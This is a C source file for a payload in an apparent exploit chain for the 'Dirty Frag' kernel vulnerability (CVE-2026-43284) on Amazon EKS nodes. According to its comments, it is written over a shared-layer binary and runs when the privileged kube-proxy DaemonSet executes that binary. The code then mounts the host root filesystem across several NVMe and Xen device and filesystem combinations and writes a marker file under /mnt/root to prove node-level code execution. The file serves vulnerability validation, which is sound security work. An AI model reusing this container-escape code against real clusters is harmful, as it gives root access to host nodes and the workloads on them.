/* SPDX-License-Identifier: LGPL-2.1-or-later OR MIT */
/*
 * Dirty Frag (CVE-2026-43284) -- EKS validation payload.
 *
 * This tiny static ELF is embedded inside the exploit binary and written
 * over the first N bytes of a shared-layer binary (ipset, xtables-*, nft).
 * When the privileged kube-proxy DaemonSet later executes the corrupted
 * binary, this payload runs with the DaemonSet's privileges, mounts the
 * host root filesystem, and writes a marker file to prove node-level code
 * execution.
 *
 * EKS nodes use NVMe storage (Nitro instances: /dev/nvme0n1p1) or
 * legacy Xen block devices (/dev/xvda1).  Amazon Linux 2/2023 default
 * to XFS.  This payload tries multiple device/fs combinations.
 *
 * Build: see Makefile (`make payload-eks`).
 */

#include "nolibc/nolibc.h"

static int try_mount(const char *dev, const char *fstype)
{
    return mount(dev, "/mnt", fstype, 0, NULL);
}

int main(void)
{
    const char msg[] = "[*] success";
    int fd;

    mkdir("/mnt", 0755);

    if (try_mount("/dev/nvme0n1p1", "xfs") &&
        try_mount("/dev/nvme0n1p1", "ext4") &&
        try_mount("/dev/xvda1", "xfs") &&
        try_mount("/dev/xvda1", "ext4") &&
        try_mount("/dev/nvme0n1p2", "xfs") &&
        try_mount("/dev/nvme0n1p2", "ext4"))
        return 1;

    fd = open("/mnt/root/res", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0)
        return 1;

    if (write(fd, msg, sizeof(msg) - 1) != (ssize_t)(sizeof(msg) - 1)) {
        close(fd);
        return 1;
    }

    close(fd);
    return 0;
}
